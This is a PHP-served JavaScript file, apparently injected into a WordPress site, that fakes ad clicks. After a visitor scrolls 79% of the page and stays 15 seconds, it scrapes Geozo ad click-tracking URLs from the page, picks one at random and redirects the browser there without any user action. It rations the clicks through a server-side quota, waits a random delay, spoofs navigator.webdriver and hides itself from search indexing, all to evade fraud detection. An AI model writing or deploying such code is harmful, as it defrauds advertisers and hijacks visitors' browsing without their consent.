<?php
header("Content-Type: application/javascript");
header("X-Robots-Tag: noindex, nofollow");
?>

const DEBUG = false;
const SCROLL_TRIGGER = 79;
let geozoAccessed = false;
let geozoUrl = null;
let scrolledEnough = false;
const entryTime = Date.now();

function log(...args) {
  if (DEBUG) console.log('[Geozo]', ...args);
}

function extractGeozoImageUrls(source) {
  const regex = /https:\/\/render\.county-point\.com\/v1\/direct\/click\?[^"'\s]+/g;
  const matches = source.match(regex);
  log("🧩 URL-uri detectate n pagină:", matches);
  return matches || [];
}

function decideUrl(urls) {
  if (urls.length < 6) {
    log("❗ Prea puține URL-uri:", urls.length);
    return null;
  }
  const rand = Math.random();
  const selected = rand < 0.40 ? urls[1] : urls[3];
  log(`🎯 Random: ${rand.toFixed(2)} -> URL selectat:`, selected);
  return selected;
}

function decodeHtmlEntities(str) {
  const txt = document.createElement('textarea');
  txt.innerHTML = str;
  const decoded = txt.value;
  log(" URL decodat:", decoded);
  return decoded;
}

async function checkPermise() {
  try {
    log("🔍 Verific permisiunea de redirect...");
    const res = await fetch('/wp-admin/admin-ajax.php?action=geozo_check_clicks');
    const data = await res.json();
    log("📊 Răspuns AJAX:", data);
    return data.permise > data.executate;
  } catch (e) {
    log("⛔ Eroare AJAX:", e);
    return false;
  }
}

try {
  if (!('webdriver' in navigator)) {
    Object.defineProperty(navigator, "webdriver", { get: () => false });
    log("🛡️ navigator.webdriver setat pe false");
  }
} catch (e) {
  log("⚠️ Eroare navigator.webdriver:", e);
}

window.addEventListener("scroll", () => {
  const scrollPercentage = (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100;
  log("📏 Scroll:", scrollPercentage.toFixed(2), "%");
  if (scrollPercentage >= SCROLL_TRIGGER) {
    scrolledEnough = true;
    log("✅ Scroll suficient pentru declanșare");
  }
});

const interval = setInterval(async () => {
  if (geozoAccessed) {
    log("🚫 Deja accesat, ies din interval");
    clearInterval(interval);
    return;
  }

  const timeSpent = (Date.now() - entryTime) / 1000;
  log("⏱️ Timp petrecut:", timeSpent.toFixed(1), "secunde");

  if (scrolledEnough && timeSpent >= 15) {
    geozoAccessed = true;
    clearInterval(interval);
    log("🚀 Condiții îndeplinite: inițiez secvența de redirect");

    const isAllowed = await checkPermise();
    if (!isAllowed) {
      log("🚫 Redirect blocat - permisiuni insuficiente");
      return;
    }

    const urls = extractGeozoImageUrls(document.documentElement.innerHTML);
    if (!urls.length) {
      log("❌ Niciun URL Geozo găsit n pagină");
      return;
    }

    geozoUrl = decodeHtmlEntities(decideUrl(urls));
    if (!geozoUrl) {
      log("❌ URL invalid sau neselectat");
      return;
    }

    log("🎯 URL final pentru redirect:", geozoUrl);

    fetch('/wp-admin/admin-ajax.php?action=geozo_register_click', {
      method: 'POST'
    }).finally(() => {
      const delay = 1300 + Math.floor(Math.random() * 900);
      log(`⏳ Aștept ${delay}ms înainte de redirecționare...`);
      setTimeout(() => {
        log("➡️ Redirecționez către:", geozoUrl);
        window.location.href = geozoUrl;
      }, delay);
    });
  }
}, 500);
